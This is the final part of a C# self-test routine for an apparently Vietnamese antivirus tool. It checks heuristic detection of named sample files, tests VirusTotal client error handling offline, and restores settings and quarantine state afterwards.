                            t.FilePath.EndsWith(TestSamples.JsPrefixName) && t.Kind == "Chữ ký"));
                        Check("[Mẫu] KT2: hoa-don-invoice.pdf.exe -> Heuristic", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.SpoofSampleName) && t.Kind == "Heuristic"
                            && t.Reason.Contains("đuôi kép")));
                        Check("[Mẫu] KT2: update-flash.ps1 -> Heuristic", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.ScriptSampleName) && t.Kind == "Heuristic"));
                        Check("[Mẫu] KT2: downloader-tien-ich.vbs -> 3 marker script", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.VbsSampleName) && t.Kind == "Heuristic"));
                        Check("[Mẫu] KT2: exe ẩn + mồi câu (70/100)", sampleState.Threats.Any(t =>
                            t.FilePath.EndsWith(TestSamples.HiddenExeName) && t.Kind == "Heuristic"
                            && t.Reason.Contains("tệp thực thi bị ẩn")));
                        Check("[Mẫu] ĐỐI CHỨNG: keygen-pro.exe mồi câu 30/100 — KHÔNG báo",
                            !sampleState.Threats.Any(t => t.FilePath.EndsWith(TestSamples.CrackedExeName)));
                        Check("[Mẫu] ĐỐI CHỨNG: script-sach.ps1 script lành — KHÔNG báo",
                            !sampleState.Threats.Any(t => t.FilePath.EndsWith(TestSamples.CleanScriptName)));
                        Check("[Mẫu] README-mau.txt SẠCH — không dương tính giả",
                            !sampleState.Threats.Any(t => t.FilePath.EndsWith(TestSamples.BenignSampleName)));

                        // --- preflight upload (KHÔNG mạng: backup key để mọi nhánh đi đường lỗi tất định) ---
                        string vtK = File.Exists(VirusTotalClient.ApiKeyPath)
                            ? File.ReadAllText(VirusTotalClient.ApiKeyPath) : null;
                        try
                        {
                            if (vtK != null) File.Delete(VirusTotalClient.ApiKeyPath);
                            var upNoKey = VirusTotalClient.UploadAndAnalyze(sampleFiles[0]);
                            var qNoKey = VirusTotalClient.QueryHashOrUpload(null, sampleFiles[0]);
                            Check("[VT] UploadAndAnalyze thiếu key -> báo lỗi, không nổ",
                                upNoKey.Error != null && upNoKey.Error.Contains("API key"));
                            Check("[VT] QueryHashOrUpload hash rỗng -> lỗi rõ", qNoKey.Error != null);
                            string huge = Path.Combine(gdir, "huge.bin");
                            using (var hfs = File.Create(huge)) hfs.SetLength(33L * 1024 * 1024);
                            VirusTotalClient.SaveApiKey("fake-key"); // đủ điều kiện qua vòng key -> tới size-gate
                            try {
                            var upBig2 = VirusTotalClient.UploadAndAnalyze(huge);
                            Check("[VT] chặn tệp >32MB trước khi gọi mạng",
                                upBig2.Error != null && upBig2.Error.Contains("32MB"));
                            } finally { File.Delete(VirusTotalClient.ApiKeyPath); }
                        }
                        finally
                        {
                            if (vtK != null) File.WriteAllText(VirusTotalClient.ApiKeyPath, vtK);
                            else { try { File.Delete(VirusTotalClient.ApiKeyPath); } catch { } }
                        }
                        Check("[VT] Extract data-URL từ JSON",
                            VirusTotalClient.ExtractJsonStringValue("{\"data\":\"https://x/upload/ab\"}", "data")
                                == "https://x/upload/ab");
                        Check("[VT] Extract analysis-id từ JSON",
                            VirusTotalClient.ExtractJsonStringValue("{\"data\":{\"type\":\"analysis\",\"id\":\"file-99\"}}", "id")
                                == "file-99");
                        // (giữ nguyên thư mục TestSamples trong repo — không xóa; nút "Tạo tệp mẫu" chỉ ghi đè idempotent)
                    }
                    catch (Exception exSample)
                    {
                        Check("[Mẫu] không nổ: " + exSample.Message, false);
                    }
                }
                finally
                {
                    GuardService.ThreatDetected -= guardHandler;
                    FeatureFlags.FileRestoreGuard = flagsWas[0];
                    FeatureFlags.UsbProtection = flagsWas[1];
                    FeatureFlags.DownloadProtection = flagsWas[2];
                    FeatureFlags.BehaviorWatch = flagsWas[3];
                    FeatureFlags.StartupFoldersWatch = flagsWas[4];
                    FeatureFlags.VtAutoQuery = flagsWas[5];
                    FeatureFlags.AutoUpdateEnabled = flagsWas[6];
                    if (settingsBak != null) File.WriteAllText(AppSettings.SettingsPath, settingsBak);
                    else { try { File.Delete(AppSettings.SettingsPath); } catch { } }
                    if (dbBak != null) File.WriteAllText(ScanHistoryStore.SignatureUpdatePath, dbBak);
                    try { Directory.Delete(gdir, true); } catch { }
                }
            }
            finally
            {
                try { Directory.Delete(ledgerRoot, true); } catch { }
            }
        }
        finally
        {
            // Dọn dẹp: xoá thư mục test + các tệp cách ly do test tạo ra
            try { Directory.Delete(root, true); } catch { }
            if (Directory.Exists(ScanEngine.QuarantineDir))
                foreach (string f in Directory.GetFiles(ScanEngine.QuarantineDir))
                    if (!quarantineBefore.Contains(f)) File.Delete(f);
        }

        Console.WriteLine(failures == 0 ? "== ALL TESTS PASSED ==" : "== " + failures + " TEST(S) FAILED ==");
        return failures;
    }
}
